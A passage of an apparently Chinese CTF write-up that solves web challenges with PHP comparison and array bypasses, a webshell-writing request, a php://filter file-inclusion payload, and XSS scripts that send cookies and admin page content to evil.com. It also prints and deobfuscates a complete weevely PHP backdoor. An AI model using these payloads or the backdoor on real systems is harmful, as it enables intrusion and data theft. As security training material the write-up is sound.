class="keyword">if</span> (<span class="title function_ invoke__">sha1</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>]) === <span class="title function_ invoke__">sha1</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">print</span> <span class="string">&#x27;You passed stage 2.&lt;br /&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">print</span> <span class="string">&#x27;Flag: &#x27;</span>.<span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">print</span> <span class="string">&#x27;Invalid password&#x27;</span>;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;hr /&gt;&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>看源码一共有两关，第一关需要</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;test&#x27;</span>]) == <span class="number">0</span>;</span><br></pre></td></tr></table></figure>

<p>这里用的是弱等于，所以只需要找到一个 md5 是 0e 开的字符串就行，例如<code>QNKCDZO</code>，在弱等于时 0e 开头的字符串将会识别为科学计数法。第二关需要</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>] != <span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>] &amp;&amp; <span class="title function_ invoke__">sha1</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>]) === <span class="title function_ invoke__">sha1</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>]</span><br></pre></td></tr></table></figure>

<p>这里需要 name 和 password 不相等，但是他们的 sha1 要相等，并且还是强等于，由于 sha1 函数无法处理数组，所以当 name 和 password 同是数组时 sha1 函数将返回 false，并且 name 和 password 是一个不相等的数组。<br>payload 为：<code>/?test=QNKCDZO&amp;name[]=a&amp;password[]=b</code></p>
<p>最后获得 flag 为：<code>flag&#123;=_=PHP_1S_TH3_BES7_L4NGUAGE&#125;</code></p>
<h1 id="Basic-PHP-2-75"><a href="#Basic-PHP-2-75" class="headerlink" title="Basic PHP 2(75)"></a>Basic PHP 2(75)</h1><p>直接给了源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;content&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$filename</span> = <span class="string">&#x27;config.php&#x27;</span>;</span><br><span class="line">    <span class="variable">$content</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_int</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$content</span>, <span class="string">&#x27;php&#x27;</span>)) || <span class="title function_ invoke__">is_int</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$content</span>, <span class="string">&#x27;&lt;&#x27;</span>))) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Invalid input&#x27;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>, <span class="variable">$content</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Success&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>目的是要写入一个 webshell，文件名是 config.php，所以不需要担心文件后缀的问题，但是源码里不允许在文件内容中出现 <code>php</code> 以及 <code>&lt;</code>，类似 Basic PHP 1，当传入的 content 是一个数组时，<code>stripos</code> 函数将会返回 false，这样就可以绕过 <code>is_int</code> 函数。</p>
<p>payload 为：<code>/index.php?content[]=&lt;%3Fphp+eval%28%24_GET%5Ba%5D%29%3B</code></p>
<p>最后获取 flag 为：<code>flag&#123;pwnhub_first_shalon_ctf_web_php&#125;</code></p>
<h1 id="BabyXSS-100"><a href="#BabyXSS-100" class="headerlink" title="BabyXSS(100)"></a>BabyXSS(100)</h1><p>是一个很简单的打 cookie 的 XSS，提到了 flag 在 admin.php 里，但是需要 admin 的 cookie。</p>
<p>测试 paylaod：<code>&lt;img src=&#39;http://evil.com/xss/&#39;/&gt;</code>，发现有反应，那就可以直接在参数里带上 cookie</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=<span class="string">&#x27;http://evil.com/xss/?cookie=&#x27;</span>+<span class="built_in">escape</span>(<span class="variable language_">document</span>.<span class="property">cookie</span>)/&gt;</span><br></pre></td></tr></table></figure>

<p>但是发现发来的 cookie 是空的，所以拿不到管理员的 cookie，但是可以用 CSRF，通过 XSS 用管理员的 cookie 去访问 admin.php，最后再把访问到的结果发到 XSS 服务器上。payload 如下</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">var</span> xhr = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span></span><br><span class="line"><span class="language-javascript">xhr.<span class="property">onreadystatechange</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">if</span> (xhr.<span class="property">readyState</span> == <span class="number">4</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">        img = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;img&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">        img.<span class="property">src</span> = <span class="string">&#x27;http://evil.com/xss/?content=&#x27;</span> + <span class="built_in">escape</span>(xhr.<span class="property">responseText</span>);</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">document</span>.<span class="title function_">getElementsByTagName</span>(<span class="string">&#x27;body&#x27;</span>)[<span class="number">0</span>].<span class="title function_">appendChild</span>(img);</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript">xhr.<span class="title function_">open</span>(<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;/admin.php&#x27;</span>, <span class="literal">true</span>);</span></span><br><span class="line"><span class="language-javascript">xhr.<span class="title function_">send</span>(<span class="literal">null</span>);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>最后获得的 flag 为：<code>flag&#123;this_is_a_xss_flag&#125;</code></p>
<h1 id="BasicFileInclude-150"><a href="#BasicFileInclude-150" class="headerlink" title="BasicFileInclude(150)"></a>BasicFileInclude(150)</h1><p>最简单的文件包含题目，url 里直接包含了 flag.php，那么就可以使用 php 伪协议读取 flag.php，由于再后端结尾自动拼接了”.php”，所以就不用加上 php 文件后缀了。</p>
<p>payload 如下：<code>?page=php://filter/read=convert.base64-encode/resource=flag</code></p>
<p>最后获得 flag 为：<code>flag&#123;really_basic_skill_web_dog_should_know&#125;</code></p>
<h1 id="FxxkingBackdoor-175"><a href="#FxxkingBackdoor-175" class="headerlink" title="FxxkingBackdoor(175)"></a>FxxkingBackdoor(175)</h1><p>下载打开 backdoor.php，这是一个木马软件 weevely 生成的 php 木马</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Signature For Report</span></span><br><span class="line"><span class="comment">*/</span><span class="variable">$c</span>=<span class="string">&#x27;ue)ery)e&quot;],$q);$q=array_valu)ees($q);preg_)ema)etch_all()e&quot;/([\w]&#x27;</span>;<span class="comment">/*</span></span><br><span class="line"><span class="comment">*/</span><span class="variable">$e</span>=<span class="string">&#x27;$i&lt;$l);$j++)e,$i++)&#123;$o.=$t&#123;)e$i&#125;^$k&#123;$j&#125;;&#125;&#125;retur)en )e$o;&#125;$r=$_SER&#x27;</span>;<span class="comment">/*</span></span><br><span class="line"><span class="comment">*/</span><span class="variable">$G</span>=<span class="string">&#x27;o=ob_get_conte)ents();ob_e)end_cle)ean();$d=base)e64_encod)ee(x(g&#x27;</span>;<span class="comment">/*</span></span><br><span class="line"><span class="comment">*/</span><span class="variable">$g</span>=<span class="string">&#x27;$)ekh)e=&quot;d0)e3a&quot;;$kf=&quot;1f3c&quot;;function x($t)e,$k)&#123;$c=strlen($k);$l=&#x27;</span>;<span class="comment">/*</span></span><br><span class="line"><span class="comment">*/</span><span class="variable">$F</span>=<span class="string">&#x27;=strpos($s[)e$i],$f);)eif($e)&#123;$k=$kh.$kf;ob)e_sta)ert();@eval)e(@&#x27;</span>;<span class="comment">/*</span></span><br><span class="line"><span class="comment">*/</span><span class="variable">$I</span>=<span class="string">&#x27;gz)eunco)empress(@)ex(@b)ease6)e4_decode(p)ere)eg_repl)eace()ear)&#x27;</span>;<span class="comment">/*</span></span><br><span class="line"><span class="comment">*/</span><span class="variable">$h</span>=<span class="string">&#x27;_sta)ert();$s=&amp;$_SES)eSION;$ss=&quot;substr&quot;;$sl=&quot;s)etrtolower&quot;;$i=)e$&#x27;</span>;<span class="comment">/*</span></span><br><span class="line"><span class="comment">*/</span><span class="variable">$K</span>=<span class="string">&#x27;U)eAGE&quot;];if($rr&amp;&amp;)e$ra)&#123;$u=pa)erse_url($rr))e;parse)e_str)e($u[&quot;q&#x27;</span>;<span class="comment">/*</span></span><br><span class="line"><span class="comment">*/</span><span class="variable">$M</span>=<span class="string">&#x27;m[1][)e0].$m[1])e[1];$h=$sl($ss(m)ed5($i.$k)eh),0,3)e));$f=$sl($s&#x27;</span>;<span class="comment">/*</span></span><br><span class="line"><span class="comment">*/</span><span class="variable">$C</span>=<span class="string">&#x27;s()emd5($i)e.$kf),0,3));$p=&quot;&quot;;)efor($z=1;$z&lt;count($m[1]);$z++)$p.&#x27;</span>;<span class="comment">/*</span></span><br><span class="line"><span class="comment">*/</span><span class="variable">$n</span>=<span class="string">&#x27;)eVE)eR;$rr=@$r[&quot;HTTP_REFERE)eR&quot;)e];$ra=)e@$r[&quot;HTTP_AC)eCEPT_LANG&#x27;</span>;<span class="comment">/*</span></span><br><span class="line"><span class="comment">*/</span><span class="variable">$p</span>=<span class="string">&#x27;=$q)e[$m[2][$z]];if(strpos()e$p)e,$)eh)===0)&#123;$s[$)ei])e=&quot;)e&quot;;$p=$&#x27;</span>;<span class="comment">/*</span></span><br><span class="line"><span class="comment">*/</span><span class="variable">$s</span>=<span class="string">&#x27;zcompress($o),$k));print(&quot;&lt;$k&gt;$d&lt;/$)ek&gt;&quot;);@sess)eion_de)estroy();&#x27;</span>;<span class="comment">/*</span></span><br><span class="line"><span class="comment">*/</span><span class="variable">$R</span>=<span class="string">&#x27;)ess($)ep,3))e;&#125;if(array_key_exists()e$i,$)es))e)&#123;$s)e[$i].=$p;$e&#x27;</span>;<span class="comment">/*</span></span><br><span class="line"><span class="comment">*/</span><span class="variable">$V</span>=<span class="string">&#x27;strlen($t);$o=&quot;&quot;;f)eor($)ei=0;)e$i)e&lt;$l;)e)&#123;)efor($j=0)e;($j&lt;$c&amp;&amp;&#x27;</span>;<span class="comment">/*</span></span><br><span class="line"><span class="comment">*/</span><span class="variable">$y</span>=<span class="string">&#x27;)[\w-]+(?:;q=0.([\d]))?)e,?/&quot;,$ra,$m);i)ef()e$q&amp;&amp;)e$m)&#123;@sessi)eon&#x27;</span>;<span class="comment">/*</span></span><br><span class="line"><span class="comment">*/</span><span class="variable">$P</span>=<span class="string">&#x27;eray(&quot;/_/&quot;,&quot;/-/&quot;),array(&quot;/&quot;,&quot;+&quot;),$ss()e$s[$i],0)e,$e))),$)ek)));$&#x27;</span>;<span class="comment">/*</span></span><br><span class="line"><span class="comment">*/</span><span class="variable">$t</span>=<span class="string">&#x27;&#125;&#125;&#125;&#125;&#x27;</span>;<span class="variable">$Y</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;crbebbabte_funcbbtion&#x27;</span>);<span class="comment">/*</span></span><br><span class="line"><span class="comment">*/</span><span class="variable">$L</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;)e&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$g</span>.<span class="variable">$V</span>.<span class="variable">$e</span>.<span class="variable">$n</span>.<span class="variable">$K</span>.<span class="variable">$c</span>.<span class="variable">$y</span>.<span class="variable">$h</span>.<span class="variable">$M</span>.<span class="variable">$C</span>.<span class="variable">$p</span>.<span class="variable">$R</span>.<span class="variable">$F</span>.<span class="variable">$I</span>.<span class="variable">$P</span>.<span class="variable">$G</span>.<span class="variable">$s</span>.<span class="variable">$t</span>);<span class="comment">/*</span></span><br><span class="line"><span class="comment"> */</span><span class="keyword">echo</span> <span class="variable">$L</span>.<span class="string">&#x27;&lt;br/&gt;&#x27;</span>;<span class="keyword">echo</span> <span class="variable">$Y</span>;<span class="variable">$v</span>=<span class="variable">$Y</span>(<span class="string">&#x27;&#x27;</span>,<span class="variable">$L</span>);<span class="variable">$v</span>();<span class="comment">/*</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure>

<p>最前面都是经过混淆后的代码，最后真正开始执行的语句是</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$v</span>=<span class="variable">$Y</span>(<span class="string">&#x27;&#x27;</span>,<span class="variable">$L</span>);<span class="variable">$v</span>();</span><br></pre></td></tr></table></figure>

<p>所以在这条语句前打印一下看看它执行了什么</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="variable">$Y</span>.<span class="string">&#x27;&lt;br/&gt;&#x27;</span>;<span class="title function_ invoke__">highlight_string</span>(<span class="variable">$L</span>);<span class="variable">$v</span>=<span class="variable">$Y</span>(<span class="string">&#x27;&#x27;</span>,<span class="variable">$L</span>);<span class="variable">$v</span>();</span><br></pre></td></tr></table></figure>

<p>输出如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">create_function</span><br><span class="line"><span class="variable">$kh</span>=<span class="string">&quot;d03a&quot;</span>;<span class="variable">$kf</span>=<span class="string">&quot;1f3c&quot;</span>;<span class="function"><span class="keyword">function</span> <span class="title">x</span>(<span class="params"><span class="variable">$t</span>,<span class="variable">$k</span></span>)</span>&#123;<span class="variable">$c</span>=<span class="title function_ invoke__">strlen</span>(<span class="variable">$k</span>);<span class="variable">$l</span>=<span class="title function_ invoke__">strlen</span>(<span class="variable">$t</span>);<span class="variable">$o</span>=<span class="string">&quot;&quot;</span>;<span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="variable">$l</span>;)&#123;<span class="keyword">for</span>(<span class="variable">$j</span>=<span class="number">0</span>;(<span class="variable">$j</span>&lt;<span class="variable">$c</span>&amp;&amp;<span class="variable">$i</span>&lt;<span class="variable">$l</span>);<span class="variable">$j</span>++,<span class="variable">$i</span>++)&#123;<span class="variable">$o</span>.=<span class="variable">$t</span>&#123;<span class="variable">$i</span>&#125;^<span class="variable">$k</span>&#123;<span class="variable">$j</span>&#125;;&#125;&#125;<span class="keyword">return</span> <span class="variable">$o</span>;&#125;<span class="variable">$r</span>=<span class="variable">$_SERVER</span>;<span class="variable">$rr</span>=@<span class="variable">$r</span>[<span class="string">&quot;HTTP_REFERER&quot;</span>];<span class="variable">$ra</span>=@<span class="variable">$r</span>[<span class="string">&quot;HTTP_ACCEPT_LANGUAGE&quot;</span>];<span class="keyword">if</span>(<span class="variable">$rr</span>&amp;&amp;<span class="variable">$ra</span>)&#123;<span class="variable">$u</span>=<span class="title function_ invoke__">parse_url</span>(<span class="variable">$rr</span>);<span class="title function_ invoke__">parse_str</span>(<span class="variable">$u</span>[<span class="string">&quot;query&quot;</span>],<span class="variable">$q</span>);<span class="variable">$q</span>=<span class="title function_ invoke__">array_values</span>(<span class="variable">$q</span>);<span class="title function_ invoke__">preg_match_all</span>(<span class="string">&quot;/([\w])[\w-]+(?:;q=0.([\d]))?,?/&quot;</span>,<span class="variable">$ra</span>,<span class="variable">$m</span>);<span class="keyword">if</span>(<span class="variable">$q</span>&amp;&amp;<span class="variable">$m</span>)&#123;@<span class="title function_ invoke__">session_start</span>();<span class="variable">$s</span>=&amp;<span class="variable">$_SESSION</span>;<span class="variable">$ss</span>=<span class="string">&quot;substr&quot;</span>;<span class="variable">$sl</span>=<span class="string">&quot;strtolower&quot;</span>;<span class="variable">$i</span>=<span class="variable">$m</span>[<span class="number">1</span>][<span class="number">0</span>].<span class="variable">$m</span>[<span class="number">1</span>][<span class="number">1</span>];<span class="variable">$h</span>=<span class="variable">$sl</span>(<span class="variable">$ss</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$i</span>.<span class="variable">$kh</span>),<span class="number">0</span>,<span class="number">3</span>));<span class="variable">$f</span>=<span class="variable">$sl</span>(<span class="variable">$ss</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$i</span>.<span class="variable">$kf</span>),<span class="number">0</span>,<span class="number">3</span>));<span class="variable">$p</span>=<span class="string">&quot;&quot;</span>;<span class="keyword">for</span>(<span class="variable">$z</span>=<span class="number">1</span>;<span class="variable">$z</span>&lt;<span class="title function_ invoke__">count</span>(<span class="variable">$m</span>[<span class="number">1</span>]);<span class="variable">$z</span>++)<span class="variable">$p</span>.=<span class="variable">$q</span>[<span class="variable">$m</span>[<span class="number">2</span>][<span class="variable">$z</span>]];<span class="keyword">if</span>(<span class="title function_ invoke__">strpos</span>(<span class="variable">$p</span>,<span class="variable">$h</span>)===<span class="number">0</span>)&#123;<span class="variable">$s</span>[<span class="variable">$i</span>]=<span class="string">&quot;&quot;</span>;<span class="variable">$p</span>=<span class="variable">$ss</span>(<span class="variable">$p</span>,<span class="number">3</span>);&#125;<span class="keyword">if</span>(<span class="title function_ invoke__">array_key_exists</span>(<span class="variable">$i</span>,<span class="variable">$s</span>))&#123;<span class="variable">$s</span>[<span class="variable">$i</span>].=<span class="variable">$p</span>;<span class="variable">$e</span>=<span class="title function_ invoke__">strpos</span>(<span class="variable">$s</span>[<span class="variable">$i</span>],<span class="variable">$f</span>);<span class="keyword">if</span>(<span class="variable">$e</span>)&#123;<span class="variable">$k</span>=<span class="variable">$kh</span>.<span class="variable">$kf</span>;<span class="title function_ invoke__">ob_start</span>();@<span class="keyword">eval</span>(@<span class="title function_ invoke__">gzuncompress</span>(@<span class="title function_ invoke__">x</span>(@<span class="title function_ invoke__">base64_decode</span>(<span class="title function_ invoke__">preg_replace</span>(<span class="keyword">array</span>(<span class="string">&quot;/_/&quot;</span>,<span class="string">&quot;/-/&quot;</span>),<span class="keyword">array</span>(<span class="string">&quot;/&quot;</span>,<span class="string">&quot;+&quot;</span>),<span class="variable">$ss</span>(<span class="variable">$s</span>[<span class="variable">$i</span>],<span class="number">0</span>,<span class="variable">$e</span>))),<span class="variable">$k</span>)));<span class="variable">$o</span>=<span class="title function_ invoke__">ob_get_contents</span>();<span class="title function_ invoke__">ob_end_clean</span>();<span class="variable">$d</span>=<span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">x</span>(<span class="title function_ invoke__">gzcompress</span>(<span class="variable">$o</span>),<span class="variable">$k</span>));<span class="keyword">print</span>(<span class="string">&quot;&lt;<span class="subst">$k</span>&gt;<span class="subst">$d</span>&lt;/<span class="subst">$k</span>&gt;&quot;</span>);@<span class="title function_ invoke__">session_destroy</span>();&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>因此 L 里面存储的是 webshell 的代码，Y 是 create_funciton，所以最后创建了一个匿名函数 v 去执行 webshell，将 L 的代码格式化后如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$kh</span>=<span class="string">&quot;d03a&quot;</span>;</span><br><span class="line"><span class="variable">$kf</span>=<span class="string">&quot;1f3c&quot;</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">x</span>(<span class="params"><span class="variable">$t</span>,<span class="variable">$k</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="title function_ invoke__">strlen</span>(<span class="variable">$k</span>);</span><br><span class="line">    <span class="variable">$l</span>=<span class="title function_ invoke__">strlen</span>(<span class="variable">$t</span>);</span><br><span class="line">    <span class="variable">$o</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="variable">$l</span>;) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$j</span>=<span class="number">0</span>;(<span class="variable">$j</span>&lt;<span class="variable">$c</span>&amp;&amp;<span class="variable">$i</span>&lt;<span class="variable">$l</span>);<span class="variable">$j</span>++,<span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$o</span>.=<span class="variable">$t</span> &#123;</span><br><span class="line">                <span class="variable">$i</span></span><br><span class="line">            &#125;</span><br><span class="line">            ^<span class="variable">$k</span> &#123;</span><br><span class="line">                <span class="variable">$j</span></span><br><span class="line">            &#125;</span><br><span class="line">            ;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$o</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$r</span>=<span class="variable">$_SERVER</span>;</span><br><span class="line"><span class="variable">$rr</span>=@<span class="variable">$r</span>[<span class="string">&quot;HTTP_REFERER&quot;</span>];</span><br><span class="line"><span class="variable">$ra</span>=@<span class="variable">$r</span>[<span class="string">&quot;HTTP_ACCEPT_LANGUAGE&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$rr</span>&amp;&amp;<span class="variable">$ra</span>) &#123;</span><br><span class="line">    <span class="variable">$u</span>=<span class="title function_ invoke__">parse_url</span>(<span class="variable">$rr</span>);</span><br><span class="line">    <span class="title function_ invoke__">parse_str</span>(<span class="variable">$u</span>[<span class="string">&quot;query&quot;</span>],<span class="variable">$q</span>);</span><br><span class="line">    <span class="variable">$q</span>=<span class="title function_ invoke__">array_values</span>(<span class="variable">$q</span>);</span><br><span class="line">    <span class="title function_ invoke__">preg_match_all</span>(<span class="string">&quot;/([\w])[\w-]+(?:;q=0.([\d]))?,?/&quot;</span>,<span class="variable">$ra</span>,<span class="variable">$m</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$q</span>&amp;&amp;<span class="variable">$m</span>) &#123;</span><br><span class="line">        @<span class="title function_ invoke__">session_start</span>();</span><br><span class="line">        <span class="variable">$s</span>=&amp;<span class="variable">$_SESSION</span>;</span><br><span class="line">        <span class="variable">$ss</span>=<span class="string">&quot;substr&quot;</span>;</span><br><span class="line">        <span class="variable">$sl</span>=<span class="string">&quot;strtolower&quot;</span>;</span><br><span class="line">        <span class="variable">$i</span>=<span class="variable">$m</span>[<span class="number">1</span>][<span class="number">0</span>].<span class="variable">$m</span>[<span class="number">1</span>][<span class="number">1</span>];</span><br><span class="line">        <span class="variable">$h</span>=<span class="variable">$sl</span>(<span class="variable">$ss</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$i</span>.<span class="variable">$kh</span>),<span class="number">0</span>,<span class="number">3</span>));</span><br><span class="line">        <span class="variable">$f</span>=<span class="variable">$sl</span>(<span class="variable">$ss</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$i</span>.<span class="variable">$kf</span>),<span class="number">0</span>,<span class="number">3</span>));</span><br><span class="line">        <span class="variable">$p</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$z</span>=<span class="number">1</span>;<span class="variable">$z</span>&lt;<span class="title function_ invoke__">count</span>(<span class="variable">$m</span>[<span class="number">1</span>]);<span class="variable">$z</span>++)<span class="variable">$p</span>.=<span class="variable">$q</span>[<span class="variable">$m</span>[<span class="number">2</span>][<span class="variable">$z</span>]];</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">strpos</span>(<span class="variable">$p</span>,<span class="variable">$h</span>)===<span class="number">0</span>) &#123;</span><br><span class="line">            <span class="variable">$s</span>[<span class="variable">$i</span>]=<span class="string">&quot;&quot;</span>;</span><br><span class="line">            <span class="variable">$p</span>=<span class="variable">$ss</span>(<span class="variable">$p</span>,<span class="number">3</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">array_key_exists</span>(<span class="variable">$i</span>,<span class="variable">$s</span>)) &#123;</span><br><span class="line">            <span class="variable">$s</span>[<span class="variable">$i</span>].=<span class="variable">$p</span>;</span><br><span class="line">            <span class="variable">$e</span>=<span class="title function_ invoke__">strpos</span>(<span class="variable">$s</span>[<span class="variable">$i</span>],<span class="variable">$f</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$e</span>) &#123;</span><br><span class="line">                <span class="variable">$k</span>=<span class="variable">$kh</span>.<span class="variable">$kf</span>;</span><br><span class="line">                <span class="title function_ invoke__">ob_start</span>();</span><br><span class="line">                @<span class="keyword">eval</span>(@<span class="title function_ invoke__">gzuncompress</span>(@<span class="title function_ invoke__">x</span>(@<span class="title function_ invoke__">base64_decode</span>(<span class="title function_ invoke__">preg_replace</span>(<span class="keyword">array</span>(<span class="string">&quot;/_/&quot;</span>,<span class="string">&quot;/-/&quot;</span>),<span class="keyword">array</span>(<span class="string">&quot;/&quot;</span>,<span class="string">&quot;+&quot;</span>),<span class="variable">$ss</span>(<span class="variable">$s</span>[<span class="variable">$i</span>],<span class="number">0</span>,<span class="variable">$e</span>))),<span class="variable">$k</span>)));</span><br><span class="line">                <span class="variable">$o</span>=<span class="title function_ invoke__">ob_get_contents</span>();</span><br><span class="line">                <span class="title function_ invoke__">ob_end_clean</span>();</span><br><span class="line">                <span class="variable">$d</span>=<span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">x</span>(<span class="title function_ invoke__">gzcompress</span>(<span class="variable">$o</span>),<span class="variable">$k</span>));</span><br><span class="line">                <span class="keyword">print</span>(<span class="string">&quot;&lt;<span class="subst">$k</span>&gt;<span class="subst">$d</span>&lt;/<span class="subst">$k</span>&gt;&quot;</span>);</span><br><span class="line">                @<span class="title function_ invoke__">session_destroy</span>();</span><br><span class="line">            &#125;</span><br><span class="line">        